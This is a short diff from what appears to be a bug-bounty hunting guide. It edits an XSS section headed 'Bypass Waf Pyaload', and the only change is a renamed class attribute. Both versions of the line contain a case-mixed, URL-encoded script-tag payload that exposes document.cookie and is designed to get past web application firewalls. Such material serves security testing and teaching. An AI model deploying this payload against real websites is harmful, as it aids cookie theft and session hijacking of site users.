@@ -78,7 +78,7 @@ The vulnerable parameter for XSS should have Unfiltered : **\[“ ‘ < > $ | ( 
 **Bypass Waf Pyaload:**
 
 ```
-<%2FScriPt><sCripT+class%3DDrakenKun>document.write(document.cookie);<%2FsCriPt>
+<%2FScriPt><sCripT+class%3DXalgord>document.write(document.cookie);<%2FsCriPt>
 ```
 
 ### Open Redirect Mass Hunt
